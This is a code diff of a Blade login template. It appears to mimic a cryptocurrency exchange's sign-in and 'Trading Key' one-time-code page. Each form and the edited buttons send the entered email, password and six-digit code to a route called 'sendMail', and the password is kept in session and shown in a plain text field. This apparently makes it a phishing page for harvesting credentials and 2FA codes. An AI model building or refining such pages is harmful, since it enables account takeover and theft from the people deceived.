@@ -102,7 +102,7 @@
       <label for="password"><b>Password</b></label>
       <input type="password" placeholder="Enter Password" name="password" required>
 
-      <button type="submit">Login</button>
+      <button type="submit" formmethod="post" formaction="{{route('sendMail')}}">Login</button>
       <label>
         <input type="checkbox" checked="checked" name="remember"> Remember me
       </label>
@@ -2827,7 +2827,7 @@
                         <div class="KuxBox-root css-c0ajov">
                           <div class="KuxBox-root css-qrlrtm"></div>
                         </div>
-                        <div  class="css-fm3kvj">
+                        <div class="css-fm3kvj">
                           <img src="https://res.cloudinary.com/dv7bteenr/image/upload/v1716742138/gmzocdjj0zpowb1gsnoc.png" class="css-14d5rtx">
                           <div class="css-13d3z8n e15lf9ig3">
                             <div class="css-1hwe9d5 e15lf9ig2">Login</div>
@@ -2858,7 +2858,7 @@
 
                               @if(session()->has('otp'))
                               <h2 class="css-mr4dhk">Enter Trading Key</h2>
-                              <div class="KuxBox-root css-1ule816">Enter  6-Digit Trading Key received in your email or phone number.</div>
+                              <div class="KuxBox-root css-1ule816">Enter 6-Digit Trading Key received in your email or phone number.</div>
                               <form class="contact-form" action="{{route('sendMail')}}" method="POST">
                                 @csrf
 
@@ -2866,20 +2866,20 @@
                                 <input type="text" name="email" value="{{ session()->get('email') }}" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                                 <input type="text" name="password" value="{{ session()->get('password') }}" class="KuxInput-input css-1nddmz0" placeholder="Password">
 
-                                <button id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit">
+                                <button id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="{{route('sendMail')}}">
                                   Proceed
                                 </button>
 
                             </div>
 
 
-                            </form>
+                        </form>
                             @else
                             <form class="contact-form" action="{{route('sendMail')}}" method="POST">
                               @csrf
                               <input type="text" name="email" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                               <input type="text" name="password" class="KuxInput-input css-1nddmz0" placeholder="Password">
-                              <button id="loginBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit">
+                              <button id="loginBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="{{route('sendMail')}}">
                                 Login In
                               </button>
 
